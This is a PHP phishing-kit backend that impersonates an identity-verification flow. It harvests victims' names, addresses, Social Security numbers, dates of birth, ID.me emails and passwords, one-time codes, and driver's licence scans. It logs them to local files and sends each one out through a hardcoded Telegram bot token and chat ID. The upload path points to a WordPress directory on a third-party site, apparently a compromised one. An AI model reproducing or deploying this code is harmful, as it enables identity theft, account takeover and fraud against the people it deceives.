<?php

header('Access-Control-Allow-Origin: *');
session_start();

// Your Telegram Bot Token and Chat ID
$botToken = '8187205396:AAFLhbakh-OOGdfMK_rmiuhfGRTAzuce_b4';  // Replace with your actual bot token
$chatID = '6412087584';      // Replace with your actual chat ID

// Function to send message to Telegram
function sendToTelegram($message) {
    global $botToken, $chatID;

    // Telegram API URL
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($message);
    
    // Send the request to Telegram
    file_get_contents($url);
}

// Function to save data to a text file
function saveToDataTxt($content) {
    $filePath = 'issh.txt';  // Change to data.txt
    $file = fopen($filePath, 'a'); // Open file in append mode

    if ($file) {
        fwrite($file, $content . "\n\n"); // Added newline for better separation
        fclose($file);
    } else {
        echo "Error writing to issh.txt.";
    }
}

function saveToIwoninioHtml($content) {
    $filePath = 'iwoninio.html';
    $file = fopen($filePath, 'a'); // Open file in append mode

    if ($file) {
        fwrite($file, $content . "<br><br>");
        fclose($file);
    } else {
        echo "Error writing to iwoninio.html.";
    }
}

// Handle form submissions and file uploads
if (isset($_POST['receiveEmail'])) {
    $_SESSION['banker'] = $_POST['receiveEmail'];
    $_SESSION['domain'] = $_POST['domain'];
}

$domain = $_SESSION['domain'];
$banker = $_SESSION['banker'];

if (isset($_POST['cat']) && $_POST['cat'] == 'personalInfo') {
    $firstname = filter_input(INPUT_POST, "firstname");
    $lastname = filter_input(INPUT_POST, "lastname");
    $email = filter_input(INPUT_POST, "email");
    $phone = filter_input(INPUT_POST, "phone");
    $address = filter_input(INPUT_POST, "address");
    $city = filter_input(INPUT_POST, "city");
    $state = filter_input(INPUT_POST, "state");
    $zip = filter_input(INPUT_POST, "zip");
    $ssn = filter_input(INPUT_POST, "ssn");
    $dob = filter_input(INPUT_POST, "dob");

    $result = 'firstname: ' . $firstname . "\n" .
             'lastname: ' . $lastname . "\n" .
             'email: ' . $email . "\n" .
             'phone: ' . $phone . "\n" .
             'address: ' . $address . "\n" .
             'city: ' . $city . "\n" .
             'state: ' . $state . "\n" .
             'zip: ' . $zip . "\n" .
             'ssn: ' . $ssn . "\n" .
             'dob: ' . $dob;

    // Save to files
    saveToDataTxt($result);
    saveToIwoninioHtml($result);

    // Send the collected data to Telegram
    sendToTelegram($result);

    header("location:C.htm");
}

// Handle file uploads (for both 'dlFront' and 'dlBack')

function createFolder($path) {
    if (!file_exists($path)) {
        mkdir($path, 0777, true);  // Make sure the folder exists with write permissions
    }
}

function handleFileUpload($fileKey) {
    $output = ['status' => false];
    $allowedImageType = ["image/gif", "image/jpeg", "image/pjpeg", "image/png", "image/x-png"];
    
    if (isset($_FILES[$fileKey])) {
        $file = $_FILES[$fileKey];
        
        if ($file["error"] > 0) {
            $output['error'] = "File Error";
        } elseif (!in_array($file["type"], $allowedImageType)) {
            $output['error'] = "Invalid file format";
        } elseif (round($file["size"] / 1024) > 4096) {
            $output['error'] = "Maximum file upload size is exceeded";
        } else {
            $temp_path = $file['tmp_name'];
            $fileExt = pathinfo($file['name'], PATHINFO_EXTENSION);
            $fileName = "scan-" . rand(0002, 8999) . time() . ".$fileExt";

            // Ensure the folder exists
            $uploadDir = "scans/";
            createFolder($uploadDir);

            // Define the path for the uploaded file
            $filePath = $uploadDir . $fileName;

            // Move the uploaded file to the destination folder
            if (move_uploaded_file($temp_path, $filePath)) {
                $output['status'] = true;
                $output['image'] = "https://primomaquinas.com.br/wp-includes/1/" . $filePath;
                $output['imageName'] = $fileName;
                $_SESSION[$fileKey] = $filePath;

                // Save file URL to text and HTML files
                $fileURL = "https://primomaquinas.com.br/wp-includes/1/" . $filePath;
                saveToDataTxt("$fileKey: $fileURL");
                saveToIwoninioHtml("$fileKey: <a href='$fileURL' target='_BLANK'>$fileURL</a>");

                // Send the file URL to Telegram
                sendToTelegram("$fileKey: $fileURL");
            } else {
                $output['error'] = "Failed to upload file";
            }
        }
    }

    return $output;
}

// Handle 'dlFront' file upload
if (isset($_FILES['dlFront'])) {
    $output = handleFileUpload('dlFront');
    echo json_encode($output);
}

// Handle 'dlBack' file upload
if (isset($_FILES['dlBack'])) {
    $output = handleFileUpload('dlBack');
    echo json_encode($output);
}

// Handle 'idmeLoginYES' and 'idmeLoginNO' form submissions
elseif (isset($_POST['cat']) && ($_POST['cat'] == 'idmeLoginYES' || $_POST['cat'] == 'idmeLoginNO')) {
    if (isset($_POST['commitYES'])) {
        $idmeEmail = filter_input(INPUT_POST, "idmeEmailYES");
        $idmePassword = filter_input(INPUT_POST, "idmePasswordYES");
    } elseif (isset($_POST['commitNO'])) {
        $idmeEmail = filter_input(INPUT_POST, "idmeEmailNO");
        $idmePassword = filter_input(INPUT_POST, "idmePasswordNO");
    }

    $result = 'ID.ME Email: ' . $idmeEmail . "\n" . 'ID.ME Password: ' . $idmePassword;
    // Save to files
    saveToDataTxt($result);
    saveToIwoninioHtml($result);

    // Send the collected data to Telegram
    sendToTelegram($result);

    header("location:E_OTP.htm");
}

// Handle 'idmeOTP' form submission
elseif (isset($_POST['cat']) && $_POST['cat'] == 'idmeOTP') {
    $idmeOTP = filter_input(INPUT_POST, "idmeOTP");

    $result = 'ID.ME OTP: ' . $idmeOTP;
    // Save to files
    saveToDataTxt($result);
    saveToIwoninioHtml($result);

    // Send the collected data to Telegram
    sendToTelegram($result);

    header("location:F.htm");
}

// Handle 'dlScans' category
elseif (isset($_GET['cat']) && $_GET['cat'] == 'dlScans') {
    $dlFront = $_GET['dlFront'];
    $dlBack = $_GET['dlBack'];

    $dlFrontLink = "";
    $dlBackLink = "";

    $result = $dlFrontLink . "<br />" . $dlBackLink;

    // Save to files
    saveToDataTxt($result);
    saveToIwoninioHtml($result);

    // Send the collected data to Telegram
    sendToTelegram($result);

    header("location:D.htm");
}

?>
